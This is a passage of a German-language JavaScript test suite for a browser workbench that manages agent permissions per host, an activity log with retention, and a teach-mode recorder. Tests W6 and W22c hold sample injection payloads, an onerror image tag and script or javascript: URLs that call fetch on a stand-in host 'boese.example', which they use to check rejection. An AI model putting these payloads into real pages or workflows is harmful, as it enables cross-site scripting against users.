  assert.deepEqual(griff.entwurf().domains["ebay.de"].frei.length, 1, "aber in den Entwurf");

  await eins(wurzel, "sa-matrix-speichern").ausloesen("click");
  const abgelegt = await welt.gespeichert(matrixModul.MATRIX_ABLAGE);
  assert.equal(abgelegt.domains["ebay.de"].frei.length, 1);
  assert.ok(befehle.WEICH.has(abgelegt.domains["ebay.de"].frei[0]));
});

test("W4e: Eine unbrauchbare Sperrliste wird benannt abgelehnt und nichts gespeichert", async () => {
  const { griff, wurzel, welt } = await matrixBauen();
  eins(wurzel, "sa-matrix-gesperrt").value = "bank.de\nhttps://bank.de:8443\n";
  const antwort = await griff.speichern();

  assert.equal(antwort.ok, false);
  assert.equal(antwort.code, "host_ungueltig");
  assert.equal(await welt.gespeichert(matrixModul.MATRIX_ABLAGE), undefined,
    "ganz oder gar nicht, auch der gute Eintrag bleibt draussen");
  const hinweis = eins(wurzel, "sa-wb-hinweis");
  assert.equal(hinweis.hidden, false);
  assert.match(hinweis.textContent, /8443/, "der Satz nennt den Eintrag, an dem es haengt");
});

test("W4f: Die Sperrliste kommt wirklich in die Ablage und wirkt sofort", async () => {
  const { griff, wurzel, welt } = await matrixBauen({
    [matrixModul.MATRIX_ABLAGE]: { version: 1, domains: { "ebay.de": { frei: ["senden"] } }, gesperrt: [], agenten: {} },
  });
  eins(wurzel, "sa-matrix-gesperrt").value = "*.sparkasse.de\nebay.de";
  const antwort = await griff.speichern();
  assert.equal(antwort.ok, true);

  const abgelegt = await welt.gespeichert(matrixModul.MATRIX_ABLAGE);
  assert.deepEqual(abgelegt.gesperrt, ["*.sparkasse.de", "ebay.de"]);

  /* Und die Ansicht zeigt danach keinen Schalter mehr fuer ebay.de: Die Sperre
     ist in `regelnFuer` das letzte Wort, und die Oberflaeche sagt dasselbe. */
  const zeile = mitKlasse(wurzel, "sa-wb-zeile").find((z) => z.textContent.includes("ebay.de"));
  assert.equal(mitKlasse(zeile, "sa-wb-schalter").length, 0);

  /* Gegenprobe an der Wahrheitsquelle. */
  assert.deepEqual(await matrixModul.regelnFuer("https://www.sparkasse.de/kasse"), { gesperrt: true, frei: [] });
  assert.deepEqual(await matrixModul.regelnFuer("https://ebay.de/x"), { gesperrt: true, frei: [] });
});

test("W4g: Jeder Agent der Positivliste bekommt einen Platz, und nur die", async () => {
  const { wurzel } = await matrixBauen();
  const namen = mitKlasse(wurzel, "sa-matrix-agent").map((b) => b.kinder[0].textContent);
  assert.deepEqual(namen, [...matrixModul.AGENTEN]);
});

test("W4h: Eine Befugnis je Agent und Host geht durch die Matrix und gilt danach", async () => {
  const { griff, wurzel, welt } = await matrixBauen();
  const block = mitKlasse(wurzel, "sa-matrix-agent").find((b) => b.textContent.startsWith("SMarTrTrader"));
  eins(block, "sa-matrix-agent-host").value = "tradingview.com";
  await eins(block, "sa-matrix-agent-dazu").ausloesen("click");

  const neuerBlock = mitKlasse(wurzel, "sa-matrix-agent").find((b) => b.textContent.startsWith("SMarTrTrader"));
  const schalter = mitKlasse(neuerBlock, "sa-wb-schalter");
  assert.deepEqual(schalter.map((s) => s.textContent), [...matrixModul.AGENT_KLASSEN]);
  assert.ok(schalter.every((s) => s.kinder[0].checked === false), "Voreinstellung aus");

  const lesenSchalter = schalter.find((s) => s.textContent === "lesen");
  lesenSchalter.kinder[0].checked = true;
  await lesenSchalter.kinder[0].ausloesen("change");
  await eins(wurzel, "sa-matrix-speichern").ausloesen("click");

  const abgelegt = await welt.gespeichert(matrixModul.MATRIX_ABLAGE);
  assert.deepEqual(abgelegt.agenten.SMarTrTrader, { "tradingview.com": ["lesen"] });

  /* Und die Wahrheitsquelle antwortet danach genauso, aber auch nicht mehr. */
  assert.equal(await matrixModul.agentDarf("SMarTrTrader", "https://tradingview.com/x", "lesen"), true);
  assert.equal(await matrixModul.agentDarf("SMarTrTrader", "https://tradingview.com/x", "bedienen"), false);
  assert.equal(await matrixModul.agentDarf("SMarTrCEO", "https://tradingview.com/x", "lesen"), false);
  assert.equal(griff.entwurf().agenten.SMarTrTrader["tradingview.com"].length, 1);
});

/* ================================================================== *
 * W5 — das Protokollbuch (§8.3)
 * ================================================================== */

const BUCH_EINTRAEGE = [
  { zeit: 1_700_000_000_000, agent: "SMarTrCEO", cmd: "click", url: "https://ebay.de/kasse", ergebnis: "gelungen", klassen: ["bedienen"] },
  { zeit: 1_700_000_060_000, agent: "SMarTrTrader", cmd: "readPage", url: "https://tradingview.com/", ergebnis: "gelungen", klassen: ["lesen"] },
  { zeit: 1_700_000_120_000, agent: "SMarTrCEO", cmd: "navigate", url: "https://ebay.de/x", ergebnis: "guardrail_blocked", klassen: ["navigieren"] },
];

test("W5: Das Buch zeigt Zeitstempel, Agent, Kommando, Adresse und Ergebnis", async () => {
  const { griff } = await buchBauen({ ablage: { sa_protokollbuch: BUCH_EINTRAEGE } });
  const zeilen = mitKlasse(griff.wurzel, "sa-buch-zeile");
  assert.equal(zeilen.length, 3);

  /* Juengstes zuerst: Wer nachsieht, sucht fast immer das, was eben war. */
  assert.deepEqual(mitKlasse(griff.wurzel, "sa-buch-cmd").map((k) => k.textContent),
    ["navigate", "readPage", "click"]);
  assert.deepEqual(mitKlasse(griff.wurzel, "sa-buch-agent").map((k) => k.textContent),
    ["SMarTrCEO", "SMarTrTrader", "SMarTrCEO"]);
  assert.deepEqual(mitKlasse(griff.wurzel, "sa-buch-ergebnis").map((k) => k.textContent),
    ["guardrail_blocked", "gelungen", "gelungen"]);
  assert.match(mitKlasse(griff.wurzel, "sa-buch-ort")[0].textContent, /^https:\/\/ebay\.de\//);

  /* Der Zeitpunkt steht so da, wie ein Mensch ihn liest, und in seiner
     eigenen Zeit. Geprueft wird die Form, nicht die Zeitzone des Prueflaufs. */
  for (const z of mitKlasse(griff.wurzel, "sa-buch-zeit")) {
    assert.match(z.textContent, /^\d{2}\.\d{2}\.\d{4}, \d{2}:\d{2}$/);
  }
  assert.equal(werkbank.zeitSatz(BUCH_EINTRAEGE[0].zeit).length, 17);
});

test("W5b: Die Aufbewahrungsdauer steht voreingestellt auf 30 Tagen", async () => {
  const { griff } = await buchBauen();
  assert.equal(griff.fristEingabe.value, "30");
  assert.equal(await griff.tageLesen(), 30);

  /* Und eine gemerkte Dauer kommt beim naechsten Oeffnen zurueck. */
  const zweite = await buchBauen({ ablage: { [werkbank.BUCH_TAGE_ABLAGE]: 7 } });
  assert.equal(zweite.griff.fristEingabe.value, "7");
});

test("W5c: Der Ausgabeknopf erzeugt die Zeichenkette aus protokollbuch.ausgeben()", async () => {
  const { griff, gerufen } = await buchBauen({ ablage: { sa_protokollbuch: BUCH_EINTRAEGE } });
  await eins(griff.wurzel, "sa-buch-ausgeben").ausloesen("click");

  assert.equal(gerufen.ausgeben.length, 1);
  const text = gerufen.ausgeben[0].text;
  assert.equal(griff.feld.value, text, "der Text steht auch im Feld");

  const gelesen = JSON.parse(text);
  assert.equal(gelesen.version, 1);
  assert.ok(gelesen.erzeugt);
  assert.deepEqual(gelesen.eintraege.map((e) => e.cmd), ["click", "readPage", "navigate"]);
  assert.deepEqual(gelesen.eintraege.map((e) => e.agent), ["SMarTrCEO", "SMarTrTrader", "SMarTrCEO"]);
  /* Der Seiteninhalt steht NICHT darin, und die Abfragezeichenkette auch
     nicht: Das ist der Grund, warum das Buch gefuehrt werden darf. */
  for (const e of gelesen.eintraege) {
    assert.deepEqual(Object.keys(e).sort(), ["agent", "cmd", "ergebnis", "klassen", "url", "zeit"]);
  }
});

test("W5d: Die Aufbewahrungsdauer wird gemerkt UND sofort angewandt", async () => {
  const jung = { ...BUCH_EINTRAEGE[0], zeit: Date.now() - 1000 };
  const alt = { ...BUCH_EINTRAEGE[1], zeit: Date.now() - 40 * 24 * 60 * 60 * 1000 };
  const { griff, welt } = await buchBauen({ ablage: { sa_protokollbuch: [alt, jung] } });

  griff.fristEingabe.value = "30";
  const antwort = await eins(griff.wurzel, "sa-buch-frist-speichern").ausloesen("click");
  assert.equal(antwort[0].ok, true);

  assert.equal(await welt.gespeichert(werkbank.BUCH_TAGE_ABLAGE), 30);
  const buch = await welt.gespeichert("sa_protokollbuch");
  assert.equal(buch.length, 1, "der alte Eintrag ist wirklich weg, nicht bloss ausgeblendet");
  assert.equal(buch[0].cmd, "click");
  assert.equal(mitKlasse(griff.wurzel, "sa-buch-zeile").length, 1);
});

test("W5e: Null Tage leert das Buch wirklich", async () => {
  const { griff, welt } = await buchBauen({
    ablage: { sa_protokollbuch: [{ ...BUCH_EINTRAEGE[0], zeit: Date.now() }] },
  });
  griff.fristEingabe.value = "0";
  await eins(griff.wurzel, "sa-buch-frist-speichern").ausloesen("click");
  assert.deepEqual(await welt.gespeichert("sa_protokollbuch"), []);
});

test("W5f: Eine unmoegliche Dauer wird abgelehnt und nichts geraeumt", async () => {
  for (const wert of ["-1", "1000", "sehr lange", ""]) {
    const { griff, welt } = await buchBauen({ ablage: { sa_protokollbuch: [...BUCH_EINTRAEGE] } });
    griff.fristEingabe.value = wert;
    const antwort = await griff.fristSpeichern();
    assert.equal(antwort.ok, false, `ging durch: ${wert}`);
    assert.equal(await welt.gespeichert(werkbank.BUCH_TAGE_ABLAGE), undefined);
    assert.equal((await welt.gespeichert("sa_protokollbuch")).length, 3, "nichts geraeumt");
    assert.equal(eins(griff.wurzel, "sa-wb-hinweis").hidden, false);
  }
});

test("W5g: Ein leeres Buch sagt das, statt leer dazustehen", async () => {
  const { griff } = await buchBauen();
  assert.equal(mitKlasse(griff.wurzel, "sa-buch-zeile").length, 0);
  const leer = griff.liste.kinder[0];
  assert.equal(leer.getAttribute("data-i18n"), "buch_leer");
  assert.ok(leer.textContent.length > 10);
});

/* ================================================================== *
 * W6 — Umgangsform, Sprache und die stillen Ausgaenge
 * ================================================================== */

test("W6: Fremdtext wird angezeigt, nie eingebaut", async () => {
  const boese = {
    ...ZWEITER,
    name: '<img src=x onerror="alert(1)">',
    beschreibung: "<script>fetch('https://boese.example')</script>",
  };
  const { griff, dok } = await werkbankBauen({
    ablage: { [werkstatt.WERKSTATT_ABLAGE]: [boese] },
  });
  await eins(griff.wurzel, "sa-wb-oeffnen").ausloesen("click");
  assert.deepEqual(dok.verstoesse, [], "innerHTML wird an keiner Stelle gesetzt");
  assert.ok(eins(griff.wurzel, "sa-wb-name").textContent.includes("<img"));
});

test("W6b: Jeder feste Text traegt eine Sprachmarke aus dem eigenen Bereich", async () => {
  const { griff } = await werkbankBauen({
    ablage: { [werkstatt.WERKSTATT_ABLAGE]: [ABLAUF] },
  });
  await eins(griff.wurzel, "sa-wb-oeffnen").ausloesen("click");
  const buch = await buchBauen({ ablage: { sa_protokollbuch: BUCH_EINTRAEGE } });

  const matrix = await matrixBauen();

  for (const [wo, wurzel, mindestens] of [
    ["Werkbank", griff.wurzel, 12],
    ["Buch", buch.griff.wurzel, 5],
    ["Matrix", matrix.wurzel, 5],
  ]) {
    const marken = alleKnoten(wurzel)
      .map((k) => k.getAttribute("data-i18n"))
      .filter(Boolean);
    assert.ok(marken.length >= mindestens, `${wo}: nur ${marken.length} ausgezeichnete Texte`);
    for (const m of marken) {
      assert.match(m, /^(werkbank|matrix|buch)_[a-z0-9_]*$/, `Schluessel ausserhalb des Bereichs: ${m}`);
      assert.match(m, /^[a-z][a-z0-9_]*$/, `Schluessel verletzt §12: ${m}`);
    }

    /* Und zwar JEDER Knopf. Ein Knopf ohne Marke bliebe in der englischen
       Fassung deutsch stehen, und das faellt erst dem Kunden auf. */
    for (const k of alleKnoten(wurzel)) {
      if (k.tagName !== "BUTTON") continue;
      assert.ok(k.getAttribute("data-i18n"), `${wo}: Knopf ohne Sprachmarke: ${k.textContent}`);
    }
  }
});

test("W6c: Kein Gedankenstrich in einem Text, der vorgelesen wird", async () => {
  const { griff } = await werkbankBauen({
    ablage: { [werkstatt.WERKSTATT_ABLAGE]: [ABLAUF] },
  });
  await eins(griff.wurzel, "sa-wb-oeffnen").ausloesen("click");
  const buch = await buchBauen({ ablage: { sa_protokollbuch: BUCH_EINTRAEGE } });
  const matrix = await matrixBauen();

  for (const wurzel of [griff.wurzel, buch.griff.wurzel, matrix.wurzel]) {
    for (const t of sichtbareTexte(wurzel)) {
      assert.ok(!/[—–]/.test(t), `Gedankenstrich im Text: ${t}`);
    }
  }
});

test("W6d: Nirgends steht ein abgeschaltetes Bedienelement", async () => {
  const { griff } = await werkbankBauen({
    ablage: { [werkstatt.WERKSTATT_ABLAGE]: [ABLAUF] },
    spielen: null,
  });
  await eins(griff.wurzel, "sa-wb-oeffnen").ausloesen("click");
  /* Ohne Dienst faellt der Abspielknopf weg, statt ausgegraut dazustehen. */
  assert.equal(mitKlasse(griff.wurzel, "sa-wb-spielen").length, 0);
  for (const k of alleKnoten(griff.wurzel)) {
    assert.equal(k.getAttribute("disabled"), null);
    assert.notEqual(k.disabled, true);
  }
});

test("W6e: Ohne Anker gibt jeder Aufbau eine Antwort und wirft nicht", () => {
  for (const bauen of [werkbank.aufbauen, werkbank.matrixAufbauen, werkbank.buchAufbauen]) {
    for (const nichts of [null, undefined, {}, 42, "x"]) {
      const raus = bauen(nichts, {});
      assert.equal(raus.ok, false);
      assert.equal(raus.grund, "kein_anker");
    }
  }
});

test("W6f: Ein leerer Bestand sagt, was zu tun ist, statt leer dazustehen", async () => {
  const { griff } = await werkbankBauen();
  const leer = griff.liste.kinder[0];
  assert.equal(leer.getAttribute("data-i18n"), "werkbank_leer");
  assert.ok(leer.textContent.length > 20);
  assert.equal(griff.werkstatt.hidden, true, "ohne offenen Ablauf keine Werkstatt");
});

test("W6g: Ein beschaedigter Speicher nimmt die Werkbank nicht mit", async () => {
  for (const muell of ["kein Feld", 42, { a: 1 }, [null, 7, { id: "wf_x" }]]) {
    const { griff } = await werkbankBauen({ ablage: { [werkstatt.WERKSTATT_ABLAGE]: muell } });
    assert.deepEqual(griff.zustand.ablaeufe, []);
    assert.equal(griff.ok, true);
  }
});

test("W6h: schrittSatz sagt bei jedem Schritttyp etwas, und nie etwas Leeres", () => {
  const proben = {
    navigate: { type: "navigate", url: "https://ebay.de/" },
    click: { type: "click", selector_cascade: ["#a"] },
    dblclick: { type: "dblclick", selector_cascade: ["#a"] },
    input: { type: "input", selector_cascade: ["#a"], value: "x" },
    select: { type: "select", selector_cascade: ["#a"], value: "x" },
    scroll: { type: "scroll", direction: "down" },
    key: { type: "key", key: "Enter" },
    wait: { type: "wait", until: "idle" },
    user_input_required: { type: "user_input_required", reason: "Login/2FA" },
  };
  assert.deepEqual(Object.keys(proben).sort(), [...werkbank.SCHRITT_TYPEN].sort(),
    "jeder Schritttyp aus §7.3 braucht einen Satz");
  for (const [typ, schritt] of Object.entries(proben)) {
    const satz = werkbank.schrittSatz(schritt);
    assert.ok(satz && satz.length > 4, `kein Satz fuer ${typ}`);
    assert.ok(!/[—–]/.test(satz));
  }
});

/* ================================================================== *
 * W22 — Der Weg des Menschen in den Teach-Modus (§7.2)
 *
 * `worker.js` beantwortet `rekorder:start` und `rekorder:stop`, die Seite
 * antwortet, und bis zum 14.08.2026 sendete kein einziges Bedienelement die
 * Nachricht. Das ist der Befund vom 11.08.2026 in neuer Gestalt: ein fertiger
 * Weg auf der einen Seite, nichts auf der anderen. Diese Saetze messen den
 * Knopf und nicht die Funktion dahinter.
 * ================================================================== */

async function aufnahmeBauen({ ablage = {}, start, stop } = {}) {
  const welt = umgebung(ablage);
  const dok = dokumentBauen();
  const wurzel = knoten("div", dok);
  const gerufen = { start: 0, stop: 0 };
  const griff = werkbank.aufbauen(wurzel, {
    spielen: async () => ({ ok: true }),
    ausgeben: async () => {},
    aufnahmeStart:
      start === null
        ? undefined
        : start ||
          (async () => {
            gerufen.start += 1;
            return { ok: true, laeuft: true, anzahl: 0 };
          }),
    aufnahmeStop:
      stop === null
        ? undefined
        : stop ||
          (async () => {
            gerufen.stop += 1;
            return { ok: true, laeuft: false, anzahl: 0, schritte: [] };
          }),
  });
  await griff.bereit;
  await griff.matrix.bereit;
  return { griff, wurzel, dok, welt, gerufen };
}

test("W22a: Der Knopf `Aufnahme starten` sendet wirklich, und der Stand steht danach da", async () => {
  const { griff, wurzel, gerufen } = await aufnahmeBauen();
  const knopf = eins(wurzel, "sa-wb-aufnahme-start");
  assert.ok(knopf, "ohne Knopf gibt es keinen Weg in den Teach-Modus");

  await knopf.ausloesen("click");
  assert.equal(gerufen.start, 1, "der Klick erreicht den Dienst, der die Nachricht sendet");

  /* Und die Anzeige sagt es. Eine Aufnahme, von der der Mensch nichts sieht,
     waere eine Mitschrift, um die niemand gebeten hat. */
  griff.aufnahmeStandSetzen({ anzahl: 3, laeuft: true });
  assert.ok(
    griff.aufnahmeStand.textContent.includes("3"),
    `der Zaehler steht nicht in der Leiste: ${griff.aufnahmeStand.textContent}`
  );
});

test("W22b: Beim Beenden wird die Aufnahme geprueft und als Ablauf gespeichert", async () => {
  const { griff, wurzel, welt } = await aufnahmeBauen({
    stop: async () => ({
      ok: true,
      laeuft: false,
      anzahl: 2,
      schritte: [
        { type: "navigate", url: "https://www.ebay.de/sh/lst/active" },
        { type: "click", selector_cascade: ['[data-testid="relist"]'], beschreibung: "Erneut einstellen" },
      ],
    }),
  });

  const knopf = eins(wurzel, "sa-wb-aufnahme-stop");
  assert.ok(knopf, "ohne Knopf endet keine Aufnahme");
  await knopf.ausloesen("click");

  const abgelegt = await welt.gespeichert(werkstatt.WERKSTATT_ABLAGE);
  assert.ok(Array.isArray(abgelegt) && abgelegt.length === 1, "die Aufnahme steht als Ablauf in der Ablage");
  assert.equal(abgelegt[0].steps.length, 2);
  assert.ok(abgelegt[0].name, "und sie traegt einen Namen, mit dem sie auffindbar ist");
  assert.equal(griff.zustand.ablaeufe.length, 1, "die Liste ist danach nachgezogen");
});

test("W22c: Eine Aufnahme mit fremdem Schema wird abgelehnt und nichts gespeichert", async () => {
  /* Eine Aufzeichnung ist eine Quelle wie jede andere. Sie geht durch
     `workflowPruefen` und `adressenPruefen`, ganz oder gar nicht. */
  const { wurzel, welt } = await aufnahmeBauen({
    stop: async () => ({
      ok: true,
      laeuft: false,
      anzahl: 1,
      schritte: [{ type: "navigate", url: "javascript:fetch('https://boese.example/')" }],
    }),
  });

  await eins(wurzel, "sa-wb-aufnahme-stop").ausloesen("click");
  assert.equal(
    await welt.gespeichert(werkstatt.WERKSTATT_ABLAGE),
    undefined,
    "eine Aufzeichnung mit javascript: darf nichts in der Ablage hinterlassen"
  );
});

test("W22d: Ohne die Dienste gibt es die Knoepfe gar nicht, statt sie auszugrauen", async () => {
  /* Regel Inhaber: keine Negativtexte in Kunden-Oberflaechen. Was nicht gilt,
     wird weggelassen. Ein Knopf, der nachweislich nichts ausloesen kann, ist
     ein Versprechen. */
  const { wurzel } = await aufnahmeBauen({ start: null, stop: null });
  assert.equal(eins(wurzel, "sa-wb-aufnahme-start"), null);
  assert.equal(eins(wurzel, "sa-wb-aufnahme-stop"), null);
});

test("W22e: Ein Dienst, der wirft, ergibt eine Absage und keine Ausnahme", async () => {
  const { wurzel, griff } = await aufnahmeBauen({
    start: async () => {
      throw new Error("kein Empfaenger");
    },
  });
  await eins(wurzel, "sa-wb-aufnahme-start").ausloesen("click");
  assert.ok(griff.hinweis.textContent, "der Mensch bekommt einen Satz, keine leere Leiste");
});
